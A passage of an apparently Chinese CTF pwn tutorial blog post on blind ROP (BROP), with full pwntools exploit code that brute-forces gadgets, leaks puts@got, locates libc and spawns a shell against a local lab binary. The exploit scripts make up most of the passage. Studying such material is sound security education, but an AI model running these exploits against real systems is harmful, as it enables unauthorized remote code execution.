p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):<span class="comment">#判断是否打印\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;find hollkdig puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007c3</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure>

<p>循环递增地址，找到可以进行打印的put_plt地址，当接收字符串出现<code>&#39;\x7fELF&#39;</code>字样循环终止，为后续找到put_got地址做准备</p>
<p>最后选择0x400560作为puts_plt的地址，在IDA查看一下（正常情况下看不到）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:0000000000400550                 dq 2 dup(?)</span><br><span class="line">.plt:0000000000400560 ; [00000006 BYTES: COLLAPSED FUNCTION _puts. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000400566                 dw ?</span><br></pre></td></tr></table></figure>

<p>栈内的布局</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       	stop gadget        | stop gadget确保程序不崩溃</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       		0x400000+        | 循环递增地址，作为pop的ret地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        	0x400000 	       | ELF起始地址，地址内存放&#x27;、x7fELF&#x27;</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          0x4007c3         | pop rdi；ret地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>

<h4 id="泄露puts-got地址"><a href="#泄露puts-got地址" class="headerlink" title="泄露puts_got地址"></a>泄露puts_got地址</h4><p>得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址以后就可以利用LibcSearch查找对应的libc版本，再根据版本找到libc中的system函数和&#x2F;bin&#x2F;sh</p>
<p>PLT表和GOT在前面学习过了，这里就不赘述。在ret2csu中使用的是LibcSearch查找的函数的GOT表地址，由于此题开启了ASLR保护，所以不能使用工具去寻找，那只能手动寻找，其实要找的就是put_plt地址后面存放的jmp指令要跳转的地址。</p>
<p>手动将整个PLT部分dump下来，dump出来的文件重新设置基地址为0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，最后加上stop gadget防止崩溃</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]<span class="comment">#将接收的\nWelCome之前的字符串交给data变量</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>: <span class="comment">#如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断</span></span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span> <span class="comment">#准备一个空字符串接收dump出来的代码</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:   <span class="comment">#从0x400000开始泄露0x1000个字节，足以包含程序的plt部分</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#判断接收字符是否为空</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data <span class="comment">#接收字符串</span></span><br><span class="line">    addr += <span class="built_in">len</span>(data)  <span class="comment">#addr+接收字符串个数，避免接收重复的字符串</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment">#在当前目录下以二进制形式向hollk文件中写</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>

<p>执行后会在本地目录得到一个名为”code“的文件</p>
<p>dump出来的文件可以看作是windows下脱壳后的文件，实际情况下是看不到二进制文件的，但是dump出来的plt段的内容时可以使用IDA查看的。</p>
<ul>
<li><p>在IDA64中，选择<code>binary File</code>形式打开，选择<code>64-bit mode</code></p>
</li>
<li><p>给文件设置基地址为0x400000，<code>edit-&gt;segments-&gt;rebase program</code>，改为0x400000即可</p>
</li>
<li><p>在之前找到的puts函数的plt的地址为0x400555，找到偏移0x560处，将该地址处的数据转化为汇编指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:000000000040055F                 db    0</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400566                 db  68h ; h</span><br></pre></td></tr></table></figure>

<p>puts_got地址为0x601018</p>
</li>
</ul>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;\nWelCome&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>完整EXP</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbufferflow_length</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">            sh.send(i * <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&#x27;No password&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="built_in">print</span> content</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;one success stop gadget addr: 0x%x&#x27;</span> % (addr)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu_gadget</span>(<span class="params">csu_last, csu_middle, saved_addr, arg1=<span class="number">0x0</span>, arg2=<span class="number">0x0</span>, arg3=<span class="number">0x0</span></span>):</span><br><span class="line">    payload = p64(csu_last)  <span class="comment"># pop rbx,rbp,r12,r13,r14,r15, ret</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>)  <span class="comment"># rbx be 0x0</span></span><br><span class="line">    payload += p64(<span class="number">0x1</span>)  <span class="comment"># rbp be 0x1</span></span><br><span class="line">    payload += p64(saved_addr)  <span class="comment"># r12 jump to</span></span><br><span class="line">    payload += p64(arg3)  <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">    payload += p64(csu_middle)  <span class="comment"># will call [rbx + r12 * 0x8]</span></span><br><span class="line">    payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span>  <span class="comment"># junk</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(</span><br><span class="line">            stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> content</span><br><span class="line">        <span class="comment"># stop gadget returns memory</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">&#x27;WelCome&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)        </span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop_gadget</span>(<span class="params">length, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400740</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">            <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leakfunction</span>(<span class="params">length, rdi_ret, puts_plt, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">#stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">#brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line"><span class="comment">#puts_plt = 0x400560</span></span><br><span class="line"><span class="comment">#leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;\nWelCome&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/105913705">好好说话之re2reg_ret2reg_hollk的博客-CSDN博客</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/pqc1nq#ddWyh">Intermediate ROP (yuque.com)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#gadget">中级ROP - CTF Wiki (ctf-wiki.org)</a></p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ha1loh.github.io">HalloH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ha1loh.github.io/article/ef4f.html">https://ha1loh.github.io/article/ef4f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ha1loh.github.io" target="_blank">HalloH's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/e9e.html" title="PLT表与GOT表延迟绑定机制"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046927.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PLT表与GOT表延迟绑定机制</div></div></a></div><div class="next-post pull-right"><a href="/article/6f59.html" title="Stack Overflow - 基本ROP"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046125.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Stack Overflow - 基本ROP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/article/4622.html" title="Canary保护绕过"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046927.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-07</div><div class="title">Canary保护绕过</div></div></a></div><div><a href="/article/2066.html" title="Heap Exploitation-Off by one"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046780.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-12</div><div class="title">Heap Exploitation-Off by one</div></div></a></div><div><a href="/article/b53c.html" title="Heap Exploitation-tcache"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045731.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-18</div><div class="title">Heap Exploitation-tcache</div></div></a></div><div><a href="/article/6fb0.html" title="Heap Exploitation-unlink"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-18</div><div class="title">Heap Exploitation-unlink</div></div></a></div><div><a href="/article/ea72.html" title="Heap Exploitation-内存的分配"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221046927.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-30</div><div class="title">Heap Exploitation-内存的分配</div></div></a></div><div><a href="/article/673a.html" title="Heap Exploitation-内存管理概述"><img class="cover" src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045731.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-18</div><div class="title">Heap Exploitation-内存管理概述</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Stack-Overflow-%E4%B8%AD%E7%BA%A7ROP"><span class="toc-number">1.</span> <span class="toc-text">Stack Overflow - 中级ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">示例复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B"><span class="toc-number">1.1.3.</span> <span class="toc-text">改进</span></a></li><li class="toc-item toc-level-3"><a 